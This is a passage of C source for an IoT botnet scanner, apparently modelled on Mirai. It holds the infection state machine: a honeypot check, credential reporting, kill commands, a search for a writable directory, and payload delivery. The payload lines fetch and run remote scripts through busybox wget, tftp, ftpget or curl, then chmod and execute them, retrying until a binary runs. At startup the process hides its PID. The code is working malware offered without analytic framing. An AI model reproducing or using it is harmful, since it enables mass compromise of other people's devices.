                                    send(conn[i].fd, table[TABLE_HONEYPOT].str, table[TABLE_HONEYPOT].len, MSG_NOSIGNAL);
                                    send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);
                                    table_lock_val(TABLE_HONEYPOT);

                                    conn[i].state = SC_WAITING_HONEYPOT_RESP;
                                }
                                break;
                            case SC_WAITING_HONEYPOT_RESP:
                                if ((consumed = consume_honeypot_resp(i)) > 0) {

                                    DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') | auth: (\"%s\":\"%s\") recv() honeypot response\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->username, conn[i].auth->password);

                                    report_working(conn[i].addr, conn[i].auth);

                                    /* once we verify it's a legit device, send our kill commands as soon as possible. */

                                    table_unlock_val(TABLE_KILL_REALPATH);
                                    table_unlock_val(TABLE_KILL_MOUNTS);

                                    for (int j = 0; j < 5; j++) {
                                        send(conn[i].fd, table[TABLE_KILL_REALPATH].str, table[TABLE_KILL_REALPATH].len, MSG_NOSIGNAL);
                                        send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);

                                        send(conn[i].fd, table[TABLE_KILL_MOUNTS].str, table[TABLE_KILL_MOUNTS].len, MSG_NOSIGNAL);
                                        send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);
                                    }

                                    table_lock_val(TABLE_KILL_REALPATH);
                                    table_lock_val(TABLE_KILL_MOUNTS);

                                    table_unlock_val(TABLE_BUSYBOX);
                                    send(conn[i].fd, table[TABLE_BUSYBOX].str, table[TABLE_BUSYBOX].len, MSG_NOSIGNAL);
                                    send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);
                                    table_lock_val(TABLE_BUSYBOX);

                                    conn[i].state = SC_WAITING_BINARY_DOMAIN;
                                }
                                break;
                            case SC_WAITING_BINARY_DOMAIN:
                                if ((consumed = consume_busybox_resp(i)) > 0) {
                                    fetch_domain_ipv4();

                                    if (!domain_ipv4_len) {
                                        DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') | auth: (\"%s\":\"%s\") failed to fetch bins domain ipv4\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->username, conn[i].auth->password);
                                        close_fd(i);
                                    }
                                    else {
                                        DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') | auth: (\"%s\":\"%s\") finding write/exec dir\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->username, conn[i].auth->password);

                                        /* "> /tmp/0 && chmod 777 /tmp/0 && /tmp/0 && cd /tmp/" */

                                        table_unlock_val(TABLE_DIR_CHMOD);
                                        table_unlock_val(TABLE_DIR_CD);

                                        for (unsigned int j = 0; j < sizeof(writeable_dirs) / sizeof(writeable_dirs[0]); j++) {
                                            send(conn[i].fd, "> ", 2, MSG_NOSIGNAL);
                                            send(conn[i].fd, writeable_dirs[j].dir, writeable_dirs[j].len, MSG_NOSIGNAL);
                                            send(conn[i].fd, table[TABLE_DIR_CHMOD].str, table[TABLE_DIR_CHMOD].len, MSG_NOSIGNAL);
                                            send(conn[i].fd, writeable_dirs[j].dir, writeable_dirs[j].len, MSG_NOSIGNAL);
                                            send(conn[i].fd, table[TABLE_DIR_CD].str, 5, MSG_NOSIGNAL); // only send the first 5 characters
                                            send(conn[i].fd, writeable_dirs[j].dir, writeable_dirs[j].len, MSG_NOSIGNAL);
                                            send(conn[i].fd, table[TABLE_DIR_CD].str, table[TABLE_DIR_CD].len, MSG_NOSIGNAL);
                                            send(conn[i].fd, writeable_dirs[j].dir, writeable_dirs[j].len, MSG_NOSIGNAL);
                                            send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);
                                        }

                                        table_lock_val(TABLE_DIR_CHMOD);
                                        table_lock_val(TABLE_DIR_CD);

                                        table_unlock_val(TABLE_BUSYBOX);
                                        send(conn[i].fd, table[TABLE_BUSYBOX].str, table[TABLE_BUSYBOX].len, MSG_NOSIGNAL);
                                        send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);
                                        table_lock_val(TABLE_BUSYBOX);

                                        conn[i].state = SC_WAITING_PAYLOAD;
                                    }
                                }
                                break;
                            case SC_WAITING_PAYLOAD:
                                if ((consumed = consume_busybox_resp(i)) > 0) {
                                    switch (conn[i].payload_state) {
                                        case WGET:
                                            DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') | auth: (\"%s\":\"%s\") sending wget payload\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->username, conn[i].auth->password);

                                            // /bin/busybox wget http://127.0.0.1/wget.sh -O -> wget;chmod 777 wget;./wget

                                            table_unlock_val(TABLE_WGET);
                                            table_unlock_val(TABLE_WGET_RUN);

                                            send(conn[i].fd, table[TABLE_WGET].str, table[TABLE_WGET].len, MSG_NOSIGNAL);
                                            send(conn[i].fd, domain_ipv4, domain_ipv4_len, MSG_NOSIGNAL);
                                            send(conn[i].fd, table[TABLE_WGET_RUN].str, table[TABLE_WGET_RUN].len, MSG_NOSIGNAL);
                                            send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);

                                            table_lock_val(TABLE_WGET);
                                            table_lock_val(TABLE_WGET_RUN);

                                            break;
                                        case TFTP:
                                            DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') | auth: (\"%s\":\"%s\") sending tftp payload\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->username, conn[i].auth->password);

                                            // /bin/busybox tftp -g 127.0.0.1 -r tftp.sh -l -> tftp;chmod 777 tftp;./tftp

                                            table_unlock_val(TABLE_TFTP);
                                            table_unlock_val(TABLE_TFTP_RUN);

                                            send(conn[i].fd, table[TABLE_TFTP].str, table[TABLE_TFTP].len, MSG_NOSIGNAL);
                                            send(conn[i].fd, domain_ipv4, domain_ipv4_len, MSG_NOSIGNAL);
                                            send(conn[i].fd, table[TABLE_TFTP_RUN].str, table[TABLE_TFTP_RUN].len, MSG_NOSIGNAL);
                                            send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);

                                            table_lock_val(TABLE_TFTP);
                                            table_lock_val(TABLE_TFTP_RUN);

                                            break;
                                        case FTPGET:
                                            DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') | auth: (\"%s\":\"%s\") sending ftpget payload\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->username, conn[i].auth->password);

                                            // /bin/busybox ftpget 127.0.0.1 ftpget ftpget.sh; chmod 777 ftpget; ./ftpget
                                            // /bin/busybox ftpget 127.0.0.1 ftpget.sh ftpget;chmod 777 ftpget;./ftpget

                                            table_unlock_val(TABLE_FTPGET);
                                            table_unlock_val(TABLE_FTPGET_RUN);

                                            send(conn[i].fd, table[TABLE_FTPGET].str, table[TABLE_FTPGET].len, MSG_NOSIGNAL);
                                            send(conn[i].fd, domain_ipv4, domain_ipv4_len, MSG_NOSIGNAL);
                                            send(conn[i].fd, table[TABLE_FTPGET_RUN].str, table[TABLE_FTPGET_RUN].len, MSG_NOSIGNAL);
                                            send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);

                                            table_lock_val(TABLE_FTPGET);
                                            table_lock_val(TABLE_FTPGET_RUN);

                                            break;
                                        case CURL:
                                            DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') | auth: (\"%s\":\"%s\") sending curl payload\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->username, conn[i].auth->password);

                                            // curl http://127.0.0.1/curl.sh -o -> curl;chmod 777 curl;./curl

                                            table_unlock_val(TABLE_CURL);
                                            table_unlock_val(TABLE_CURL_RUN);

                                            send(conn[i].fd, table[TABLE_CURL].str, table[TABLE_CURL].len, MSG_NOSIGNAL);
                                            send(conn[i].fd, domain_ipv4, domain_ipv4_len, MSG_NOSIGNAL);
                                            send(conn[i].fd, table[TABLE_CURL_RUN].str, table[TABLE_CURL_RUN].len, MSG_NOSIGNAL);
                                            send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);

                                            table_lock_val(TABLE_CURL);
                                            table_lock_val(TABLE_CURL_RUN);

                                            break;
                                        default:
                                            break;
                                    }

                                    table_unlock_val(TABLE_BUSYBOX);
                                    send(conn[i].fd, table[TABLE_BUSYBOX].str, table[TABLE_BUSYBOX].len, MSG_NOSIGNAL);
                                    send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);
                                    table_lock_val(TABLE_BUSYBOX);

                                    conn[i].payload_state++;
                                    conn[i].state = SC_WAITING_EXEC_MSG;
                                }
                                break;
                            case SC_WAITING_EXEC_MSG:
                                if ((consumed = consume_exec_resp(i)) > 0) {
                                    if (!conn[i].binary_ran) {
                                        DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') | auth: (\"%s\":\"%s\") failed to run binary\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->username, conn[i].auth->password);
                                        DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') | auth: (\"%s\":\"%s\") attempting to send different payload\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->username, conn[i].auth->password);

                                        table_unlock_val(TABLE_BUSYBOX);
                                        send(conn[i].fd, table[TABLE_BUSYBOX].str, table[TABLE_BUSYBOX].len, MSG_NOSIGNAL);
                                        send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);
                                        table_lock_val(TABLE_BUSYBOX);

                                        conn[i].state = SC_WAITING_PAYLOAD;
                                    }
                                    else {
                                        DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') | auth: (\"%s\":\"%s\") successfully ran binary\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->username, conn[i].auth->password);
                                        close_fd(i);
                                    }
                                }
                                break;
                            default:
                                consumed = 0;
                                break;
                        }

                        if (!consumed || conn[i].state == SC_CONNECTING)
                            break;

                        conn[i].rdbuf_pos -= consumed;
                        memmove(conn[i].rdbuf, conn[i].rdbuf + consumed, conn[i].rdbuf_pos);
                    }
                }
            }
            else {
                if (conn[i].state == SC_CONNECTING)
                    close_fd(i);
            }
        }
    }
}

void scanner_init(void) {

    if (fork() != 0) {
        sleep(1);
        DEBUG_PRINT("[scanner_init]\n");
        return;
    }

    prctl(PR_SET_PDEATHSIG, SIGKILL);
    hide_pid();

    DEBUG_PRINT("[scanner_init] started: (\'%d\')\n", getpid());

    scanner();
    exit(0);
}
